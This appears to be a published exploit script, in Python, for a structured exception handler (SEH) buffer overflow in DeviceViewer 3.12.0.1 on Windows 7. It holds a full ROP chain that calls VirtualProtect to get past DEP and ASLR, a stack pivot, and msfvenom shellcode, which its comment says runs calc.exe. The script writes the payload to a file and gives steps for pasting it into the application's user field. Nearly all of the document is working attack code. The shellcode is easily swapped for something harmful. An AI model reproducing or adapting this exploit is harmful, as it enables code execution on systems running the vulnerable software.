# Exploit Title: DeviceViewer v3.12.0.1 (SEH - DEP + ASLR Bypass)
# Date: 11/08/2022
# Exploit Author: lem0nSec
# Software link (see ExploitDB page): https://www.exploit-db.com/exploits/47477
# Version: 3.12.0.1
# Tested on: Windows 7 Professional 64 bit Service Pack 1

# 1) Launch the application;
# 2) Login (admin:admin);
# 3) Go to 'System Configuration';
# 4) Press 'User Management';
# 5) Select a user and paste the content of sendme.txt into the user field, the press ok.

import struct


shellcode =  b""
shellcode += b"\xbe\xb0\xe7\xa7\xc5\xdb\xd4\xd9\x74\x24\xf4\x5a\x33"
shellcode += b"\xc9\xb1\x31\x31\x72\x13\x83\xea\xfc\x03\x72\xbf\x05"
shellcode += b"\x52\x39\x57\x4b\x9d\xc2\xa7\x2c\x17\x27\x96\x6c\x43"
shellcode += b"\x23\x88\x5c\x07\x61\x24\x16\x45\x92\xbf\x5a\x42\x95"
shellcode += b"\x08\xd0\xb4\x98\x89\x49\x84\xbb\x09\x90\xd9\x1b\x30"
shellcode += b"\x5b\x2c\x5d\x75\x86\xdd\x0f\x2e\xcc\x70\xa0\x5b\x98"
shellcode += b"\x48\x4b\x17\x0c\xc9\xa8\xef\x2f\xf8\x7e\x64\x76\xda"
shellcode += b"\x81\xa9\x02\x53\x9a\xae\x2f\x2d\x11\x04\xdb\xac\xf3"
shellcode += b"\x55\x24\x02\x3a\x5a\xd7\x5a\x7a\x5c\x08\x29\x72\x9f"
shellcode += b"\xb5\x2a\x41\xe2\x61\xbe\x52\x44\xe1\x18\xbf\x75\x26"
shellcode += b"\xfe\x34\x79\x83\x74\x12\x9d\x12\x58\x28\x99\x9f\x5f"
shellcode += b"\xff\x28\xdb\x7b\xdb\x71\xbf\xe2\x7a\xdf\x6e\x1a\x9c"
shellcode += b"\x80\xcf\xbe\xd6\x2c\x1b\xb3\xb4\x3a\xda\x41\xc3\x08"
shellcode += b"\xdc\x59\xcc\x3c\xb5\x68\x47\xd3\xc2\x74\x82\x90\x3d"
shellcode += b"\x3f\x8f\xb0\xd5\xe6\x45\x81\xbb\x18\xb0\xc5\xc5\x9a"
shellcode += b"\x31\xb5\x31\x82\x33\xb0\x7e\x04\xaf\xc8\xef\xe1\xcf"
shellcode += b"\x7f\x0f\x20\xac\x1e\x83\xa8\x1d\x85\x23\x4a\x62"
# msfvenom -p windows/exec cmd=calc.exe -a x86 -b "\x00\x0a\x0d" -f python

def generate_rop():

    gadgets = [

        # ROP padding: retn
        0x6A1FE589,
        0x6A1FE589,
        0x6A1FE589,
        0x6A1FE589,
        0x6A1FE589,
        0x6A1FE589,
        0x6A1FE589,
        0x6A1FE589,
        0x6A1FE589,
        0x6A1FE589,
        0x6A1FE589,
        0x6A1FE589,
        0x6A1FE589,
        0x6A1FE589,
        0x6A1FE589,
        0x6A1FE589,
        0x6A1FE589,
        0x6A1FE589,
        0x6A1FE589,

        # edx --> 0x40
        0x6a569810, # pop edx # retn
        0xFFFFFFC0,
        0x6a5d3732, # neg edx # retn

        # ebx --> dwSize (0x301)
        0x6a4a56a4, # pop eax # retn
        0xFFFFFCFF,
        0x6a2420e8, # neg eax # retn
        0x6a14ebb4, # xchg eax,ebx # retn

        # esi --> jmp [eax]
        0x6a5e03e0, # pop esi # retn
        0x6A146AE9, #JMP DWORD PTR DS:[EAX]

        # edi --> retn
        0x6a1a045d, # pop edi # retn
        0x6A1FE589, # retn

        # ecx --> lpOldProtect
        0x6a4a5711, # pop ecx # retn
        0x6ae9ca3c, # writable location

        # ebp --> pop
        0x699056c3, # pop ebp # retn
        0x699056c3,

        # eax --> &VirtualProtect
        0x6a4a56a4, # pop eax # retn
        0x6ad38304, # &VirtualProtect

        # pushad + jmp esp
        0x6a5eb992, # pushad # retn
        0x6A50CD7B, # jmp esp
        
        ]

    chain = []
    for gadget in gadgets:
        chain.append(struct.pack("<I", gadget))
    return "".join(chain)

payload = "A"*32
payload += generate_rop()
payload += "\x90"*(348-len(generate_rop()))
payload += "\xeb\x06\x90\x90"
payload += struct.pack("<I", 0x6a1fe57d)

# 0x6a1fe57d --> stackpivot
# sub eax,ebx
# add esp,90c
# pop ebx
# pop esi
# pop edi
# pop ebp
# ret

payload += "\x90"*16
payload += shellcode
payload += "D"*(5000-len(payload))

f = open("sendme.txt", "w")
f.write(payload)
f.close()
